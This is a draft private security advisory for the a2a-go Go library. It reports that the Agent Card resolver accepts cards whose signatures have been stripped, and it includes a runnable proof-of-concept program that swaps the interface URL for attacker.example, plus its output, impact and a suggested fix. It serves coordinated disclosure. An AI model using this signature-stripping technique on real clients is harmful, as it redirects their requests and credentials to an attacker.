# Security advisory draft: a2a-go, card resolver with a `Verifier` accepts unsigned cards (A9)

> **NOT SUBMITTED — on hold per product owner (more testing first).**
> Private report only. Never file this as a public issue, and do not mention it publicly until the
> maintainers have published an advisory or fixed release (a2a-go `SECURITY.md`).
>
> **License: Apache-2.0** (ANet `LICENSE`, condition 3).

Background and the full analysis: `../issue-a2a-go.md` A9. Standalone reproduction:
`repro/a2a-go/a9-unsigned-card/` (a copy of its source is embedded below, as the report must stand on
its own). Re-run it before submitting; if it prints `reproduced: no`, do not submit.

## Where and how

a2a-go `SECURITY.md` (checked 2026-09-29, unchanged at `ebf17c5`): "To report a security issue,
please use GitHub Security Advisories … We use GitHub Security Advisories for private intake,
coordination, and disclosure." Form: <https://github.com/a2aproject/a2a-go/security/advisories/new>
("Report a vulnerability"). The submitting account is the one the product owner designates
(`docs/notes/0032` §6, D1); the report does not mention anet (D5).

## Form fields

| Field | Value |
|---|---|
| Title | `agentcard.Resolver with a Verifier accepts Agent Cards that carry no signature` |
| Ecosystem | Go |
| Package | `github.com/a2aproject/a2a-go/v2` (package `a2aclient/agentcard`) |
| Affected versions | `>= 2.6.0` (v2.6.0 is the first release with Agent Card JWS verification, #368; v2.5.0 and earlier have no `Verifier`) |
| Patched versions | none (latest release and `main` are `ebf17c5`, 2026-09-29) |
| Severity (suggested; maintainers to assess) | Moderate, CVSS 3.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N` (6.5): the attacker must be able to change the card on its way to the client (host, registry, cache, TLS-terminating proxy) |
| Weaknesses | CWE-347 Improper Verification of Cryptographic Signature |
| Credits | the submitting account |

## Description (paste into the form)

````markdown
### Summary

When `agentcard.Resolver.Verifier` is set, a card that has no `signatures` member is returned as
valid. Only a card that carries signatures, none of which verifies, is rejected. Whoever can change
the card on its way to the client removes the `signatures` array and edits the card at will; the
client, which configured verification, accepts the edited card.

### Details

`a2aclient/agentcard/resolver.go` (v2.6.0, `parseCard`):

```go
if r.Verifier != nil && len(card.Signatures) > 0 {
    // verify each signature; fail if none verifies
}
return card, nil
```

Signature stripping is the standard downgrade against optional signatures. A client sets a
`Verifier` precisely because it does not trust the path the card travels (a registry, a cache, a
proxy, the agent's hosting); with the current check that path decides whether verification happens.

### PoC

Standalone program, a2a-go v2.6.0 from proxy.golang.org, standard library otherwise
(`go mod init poc && go get github.com/a2aproject/a2a-go/v2@v2.6.0 && go run .`):

```go
// A9 (security advisory draft): agentcard.Resolver with a Verifier verifies
// signatures only when the card carries some. Whoever serves the card can
// remove the "signatures" member and change anything else; the resolver
// returns the modified card without an error.
//
// Run: go run ./a9-unsigned-card
// Exit status: 0 = behaviour reproduced, 1 = not reproduced, 2 = setup error.
package main

import (
	"context"
	"crypto"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"

	"github.com/a2aproject/a2a-go/v2/a2aclient/agentcard"
	"github.com/a2aproject/a2a-go/v2/a2acrypto"
)

const card = `{"name":"Payments Agent","description":"d","version":"1",` +
	`"supportedInterfaces":[{"url":"https://payments.example/a2a","protocolBinding":"JSONRPC","protocolVersion":"1.0"}],` +
	`"capabilities":{},"defaultInputModes":["text/plain"],"defaultOutputModes":["text/plain"],` +
	`"skills":[{"id":"pay","name":"pay","description":"d","tags":["t"]}]}`

func main() {
	ctx := context.Background()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	must(err)
	signer, err := a2acrypto.NewSigner(a2acrypto.SignerConfig{PrivateKey: priv, KeyID: "k"})
	must(err)
	verifier := a2acrypto.NewVerifier(a2acrypto.VerifierConfig{
		KeyResolver: a2acrypto.KeyResolverFunc(func(context.Context, string) (crypto.PublicKey, error) { return pub, nil }),
	})
	sig, err := signer.Sign(ctx, json.RawMessage(card))
	must(err)
	sigs, err := json.Marshal([]any{sig})
	must(err)

	signed := strings.TrimSuffix(card, "}") + `,"signatures":` + string(sigs) + "}"
	modified := strings.Replace(card, "https://payments.example/a2a", "https://attacker.example/a2a", 1)
	modifiedWithSig := strings.TrimSuffix(modified, "}") + `,"signatures":` + string(sigs) + "}"

	cases := []struct{ name, body, want string }{
		{"signed card", signed, "accepted"},
		{"modified, original signature kept", modifiedWithSig, "rejected"},
		{"modified, signatures removed", modified, "rejected"},
	}
	bypassed := false
	for _, c := range cases {
		body := c.body
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, body)
		}))
		resolver := &agentcard.Resolver{Client: srv.Client(), Verifier: verifier}
		got, err := resolver.Resolve(ctx, srv.URL)
		srv.Close()
		result := "rejected: " + fmt.Sprint(err)
		if err == nil {
			result = "accepted, interface url " + got.SupportedInterfaces[0].URL
			if c.want == "rejected" {
				bypassed = true
			}
		}
		fmt.Printf("%-36s -> %s (expected: %s)\n", c.name, result, c.want)
	}
	if bypassed {
		fmt.Println("reproduced: yes")
		return
	}
	fmt.Println("reproduced: no")
	os.Exit(1)
}

func must(err error) {
	if err != nil {
		fmt.Println("setup error:", err)
		os.Exit(2)
	}
}
```

Output on v2.6.0 (2026-09-29):

```
signed card                          -> accepted, interface url https://payments.example/a2a (expected: accepted)
modified, original signature kept    -> rejected: agent card signature verification failed: signature verification failed (expected: rejected)
modified, signatures removed         -> accepted, interface url https://attacker.example/a2a (expected: rejected)
reproduced: yes
```

### Impact

A client that resolves cards with a `Verifier` treats an unsigned, modified card as verified: another
interface URL (requests, and any credentials sent with them, go to the attacker), other security
schemes, other skills. The client has no way to tell from the result that nothing was verified.

### Suggested fix

When a `Verifier` is set, require at least one verifying signature and reject a card without
`signatures`. If "verify only when present" must stay available, make it an explicit opt-in (for
example `AllowUnsigned bool`) whose doc comment describes the downgrade. A test: the resolver with a
`Verifier` rejects a card whose `signatures` member is absent, and one whose array is empty.
````

## After submission

- Record the advisory id and date in `docs/notes/0032` (not the advisory text).
- Follow up only inside the advisory. Proposed disclosure window: 90 days, or the maintainers' fix
  release if earlier.
